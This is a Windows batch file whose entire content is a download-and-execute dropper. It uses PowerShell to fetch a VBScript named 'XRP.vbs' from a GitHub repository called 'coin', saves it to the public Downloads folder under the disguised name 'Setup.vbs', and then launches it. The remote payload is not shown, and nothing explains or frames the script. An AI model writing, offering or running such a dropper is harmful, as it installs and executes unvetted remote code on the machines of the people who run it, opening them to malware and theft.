@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.vbs' -OutFile 'C:\Users\Public\Downloads\Setup.vbs'"
powershell -NoProfile -Command "Start-Sleep -Seconds 1"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\Users\Public\Downloads\Setup.vbs'"
exit
